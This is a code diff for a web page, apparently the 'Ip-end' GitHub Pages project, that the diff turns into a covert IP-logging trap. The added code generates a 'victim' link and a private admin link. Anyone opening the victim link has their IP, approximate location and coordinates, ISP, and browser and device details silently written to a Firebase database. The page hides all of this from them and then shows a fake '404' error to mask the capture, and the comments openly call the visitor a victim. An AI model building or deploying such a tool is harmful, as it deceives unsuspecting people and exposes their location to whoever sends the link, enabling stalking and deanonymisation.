@@ -79,11 +79,10 @@
   }
   .btn:hover{ opacity: 0.85; }
   .gen-result{
-    margin-top: 12px;
+    margin-top: 16px;
     font-family: var(--mono);
-    font-size: 12px;
+    font-size: 13px;
     word-break: break-all;
-    color: var(--accent);
   }
   .hero{
     text-align:center;
@@ -109,7 +108,6 @@
     font-size:15px;
     color:var(--text);
   }
-  .hero .loc span{color:var(--dim);}
   .section{
     margin-top:34px;
   }
@@ -154,28 +152,6 @@
   }
   .row .v.accent{color:var(--accent);}
   .row .v.warn{color:var(--warn);}
-  .note{
-    margin-top:40px;
-    font-size:12.5px;
-    color:var(--dim);
-    line-height:1.6;
-    border-left:2px solid var(--accent-dim);
-    padding-left:14px;
-  }
-  .skeleton{
-    display:inline-block;
-    width:140px;
-    height:14px;
-    background:linear-gradient(90deg, var(--line) 25%, #2a4448 50%, var(--line) 75%);
-    background-size:200% 100%;
-    animation:shimmer 1.3s infinite;
-    border-radius:2px;
-    vertical-align:middle;
-  }
-  @keyframes shimmer{
-    0%{background-position:200% 0;}
-    100%{background-position:-200% 0;}
-  }
 </style>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -189,26 +165,25 @@
     <div class="clock" id="clock">—</div>
   </div>
 
-  <!-- Блок створення посилання (видно тільки на головній без ?id) -->
   <div class="generator-box" id="genBox">
-    <h3>Створити персональне посилання</h3>
-    <button class="btn" id="genBtn">Згенерувати лінк</button>
+    <h3>Створити пастку</h3>
+    <button class="btn" id="genBtn">Згенерувати лінки</button>
     <div class="gen-result" id="genResult"></div>
   </div>
 
   <div class="hero">
     <div class="label" id="heroLabel">Визначена IP-адреса та геопозиція</div>
-    <div class="ip" id="heroIp"><span class="skeleton" style="width:200px;height:36px;"></span></div>
-    <div class="loc" id="heroLoc">визначення через зовнішні API…</div>
+    <div class="ip" id="heroIp">—</div>
+    <div class="loc" id="heroLoc">Аналіз...</div>
   </div>
 
   <div class="section">
     <div class="section-title">Мережа та Геолокація</div>
     <div class="rows">
-      <div class="row"><div class="k">Провайдер / ASN (ISP)</div><div class="v accent" id="isp"><span class="skeleton"></span></div></div>
-      <div class="row"><div class="k">Країна та код</div><div class="v" id="country"><span class="skeleton"></span></div></div>
-      <div class="row"><div class="k">Місто / Регіон</div><div class="v" id="city"><span class="skeleton"></span></div></div>
-      <div class="row"><div class="k">Координати</div><div class="v" id="coords"><span class="skeleton"></span></div></div>
+      <div class="row"><div class="k">Провайдер / ASN (ISP)</div><div class="v accent" id="isp">—</div></div>
+      <div class="row"><div class="k">Країна та код</div><div class="v" id="country">—</div></div>
+      <div class="row"><div class="k">Місто / Регіон</div><div class="v" id="city">—</div></div>
+      <div class="row"><div class="k">Координати</div><div class="v" id="coords">—</div></div>
       <div class="row"><div class="k">Поштовий індекс</div><div class="v" id="zip">—</div></div>
       <div class="row"><div class="k">Онлайн-статус</div><div class="v" id="online">—</div></div>
     </div>
@@ -237,13 +212,9 @@
   <div class="section">
     <div class="section-title">Безпека та система</div>
     <div class="rows">
-      <div class="row"><div class="k">Виявлення бота (webdriver)</div><div class="v" id="webdriver">—</div></div>
+      <div class="row"><div class="k">Виявлення бота</div><div class="v" id="webdriver">—</div></div>
       <div class="row full"><div class="k">User-Agent</div><div class="v" id="ua">—</div></div>
     </div>
-  </div>
-
-  <div class="note">
-    Система Ip-end виконує збір технічних параметрів середовища через стандартні інтерфейси браузера.
   </div>
 
 </div>
@@ -256,8 +227,7 @@
     projectId: "ip-end",
     storageBucket: "ip-end.firebasestorage.app",
     messagingSenderId: "503250688000",
-    appId: "1:503250688000:web:37e44bb2b990447c69e0e5",
-    measurementId: "G-PX4C45YZ93"
+    appId: "1:503250688000:web:37e44bb2b990447c69e0e5"
   };
 
   firebase.initializeApp(firebaseConfig);
@@ -269,6 +239,7 @@
   }, 1000);
 
   function displayData(d) {
+    if(!d) return;
     document.getElementById('heroIp').textContent = d.ip || '—';
     document.getElementById('heroLoc').innerHTML = (d.city || '—') + ', ' + (d.country || '—');
     document.getElementById('isp').textContent = d.isp || '—';
@@ -276,7 +247,7 @@
     document.getElementById('city').textContent = d.city || '—';
     document.getElementById('coords').textContent = d.coords || '—';
     document.getElementById('zip').textContent = d.zip || '—';
-    document.getElementById('online').textContent = d.online || 'Online';
+    document.getElementById('online').textContent = d.online || '—';
     document.getElementById('lang').textContent = d.language || '—';
     document.getElementById('tz').textContent = d.tz || '—';
     document.getElementById('netType').textContent = d.netType || '—';
@@ -298,17 +269,13 @@
       ram: navigator.deviceMemory ? '~' + navigator.deviceMemory + ' GB' : '—',
       online: navigator.onLine ? 'Online' : 'Offline',
       webdriver: navigator.webdriver ? 'ТАК (Бот)' : 'Ні (Людина)',
-      time: new Date().toISOString(),
-      ip: 'збирається...'
+      time: new Date().toISOString()
     };
 
     const conn = navigator.connection || navigator.mozConnection;
     if(conn) {
       data.netType = conn.effectiveType ? conn.effectiveType.toUpperCase() : '—';
       data.netSpeed = `${conn.downlink || '?'} Mbps`;
-    } else {
-      data.netType = '—';
-      data.netSpeed = '—';
     }
 
     try {
@@ -323,13 +290,7 @@
         data.zip = d.postal || '—';
       }
     } catch(e) {
-      try {
-        const r2 = await fetch('https://api.ipify.org?format=json');
-        const d2 = await r2.json();
-        data.ip = d2.ip;
-      } catch(err) {
-        data.ip = 'Не вдалося визначити';
-      }
+      data.ip = 'Не вдалося визначити';
     }
     return data;
   }
@@ -337,21 +298,47 @@
   async function init() {
     const urlParams = new URLSearchParams(window.location.search);
     const targetId = urlParams.get('id');
+    const viewId = urlParams.get('view');
 
-    if (targetId) {
-      // СЦЕНАРІЙ А: Це хтось відкрив згенерований лінк
+    if (viewId) {
+      // 1. АДМІНКА: Ти відкрив своє посилання для перегляду логу
       document.getElementById('genBox').style.display = 'none';
-      document.getElementById('heroLabel').textContent = 'Звіт передано (ID: ' + targetId + ')';
+      document.getElementById('heroLabel').textContent = `Твоя панель | ID логу: ${viewId}`;
+      document.getElementById('heroLoc').textContent = 'Шукаємо дані в базі...';
+
+      db.ref('logs/' + viewId).on('value', (snapshot) => {
+        const val = snapshot.val();
+        if (val) {
+          document.getElementById('heroLabel').textContent = `Дані отримано! Жертва піймалась.`;
+          document.getElementById('heroLabel').style.color = 'var(--accent)';
+          displayData(val);
+        } else {
+          document.getElementById('heroLoc').textContent = 'Жертва ще не перейшла за посиланням. Очікування...';
+        }
+      });
+
+    } else if (targetId) {
+      // 2. ЖЕРТВА: Хтось відкрив пастку
+      document.getElementById('genBox').style.display = 'none';
+      
+      // ХОВАЄМО всі таблиці, щоб жертва не бачила свої дані
+      document.querySelectorAll('.section').forEach(el => el.style.display = 'none');
+      document.getElementById('heroIp').style.display = 'none';
+      document.getElementById('heroLoc').style.display = 'none';
+      
+      document.getElementById('heroLabel').textContent = 'Завантаження сторінки...';
 
       const myData = await collectMyData();
-      displayData(myData);
-
-      db.ref('logs/' + targetId).set(myData)
-        .then(() => console.log('Дані успішно полетіли у базу!'))
-        .catch(err => console.error('Помилка запису:', err));
+      
+      db.ref('logs/' + targetId).set(myData).then(() => {
+        // Коли дані відправлені, імітуємо помилку
+        document.getElementById('heroLabel').innerHTML = 'Помилка 404.<br>Сторінку не знайдено або переміщено.';
+        document.getElementById('heroLabel').style.color = 'var(--warn)';
+        document.getElementById('heroLabel').style.fontSize = '22px';
+      });
 
     } else {
-      // СЦЕНАРІЙ Б: Ти заходиш на головну
+      // 3. ГОЛОВНА СТОРІНКА: Ти щойно зайшов
       const myData = await collectMyData();
       displayData(myData);
     }
@@ -359,30 +346,27 @@
 
   init();
 
-  // Кнопка генерації (баг виправлено: використані зворотні лапки ` ` замість ' ')
+  // Генерація двох різних посилань
   document.getElementById('genBtn').addEventListener('click', () => {
-    const randomId = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
+    const randomId = Math.random().toString(36).substring(2, 10);
     
     const currentUrl = window.location.protocol === 'file:' 
       ? 'https://simdomyt.github.io/ip-end/index.html' 
       : window.location.origin + window.location.pathname;
 
-    const uniqueLink = `${currentUrl}?id=${randomId}`;
+    const victimLink = `${currentUrl}?id=${randomId}`;
+    const adminLink = `${currentUrl}?view=${randomId}`;
     
-    document.getElementById('genResult').innerHTML = `Твоє посилання:<br><a href="${uniqueLink}" target="_blank" style="color: var(--accent);">${uniqueLink}</a>`;
-    document.getElementById('heroLabel').textContent = `Очікування переходу за лінком...`;
-    
-    // ОСЬ ТУТ БУЛА ПОМИЛКА ЧЕРЕЗ АПОСТРОФ У СЛОВІ "з'являться"
-    document.getElementById('heroLoc').textContent = `Як тільки хтось відкриє лінк, дані з'являться тут у реальному часі!`;
-
-    // Слухаємо базу
-    db.ref('logs/' + randomId).on('value', (snapshot) => {
-      const val = snapshot.val();
-      if (val && val.ip && val.ip !== 'збирається...') {
-        document.getElementById('heroLabel').textContent = `Зловмисник піймався! Отримані дані:`;
-        displayData(val);
-      }
-    });
+    document.getElementById('genResult').innerHTML = `
+      <div style="margin: 15px 0; padding: 12px; background: rgba(232, 163, 74, 0.1); border: 1px solid var(--warn); text-align: left; border-radius: 4px;">
+        <span style="color:var(--warn); font-weight:bold;">1. Кидай це ЖЕРТВІ:</span><br>
+        <a href="${victimLink}" target="_blank" style="color: #fff;">${victimLink}</a>
+      </div>
+      <div style="padding: 12px; background: rgba(79, 209, 197, 0.1); border: 1px solid var(--accent); text-align: left; border-radius: 4px;">
+        <span style="color:var(--accent); font-weight:bold;">2. ТВОЯ ПАНЕЛЬ (бережи для себе):</span><br>
+        <a href="${adminLink}" target="_blank" style="color: #fff;">${adminLink}</a>
+      </div>
+    `;
   });
 </script>
 </body>
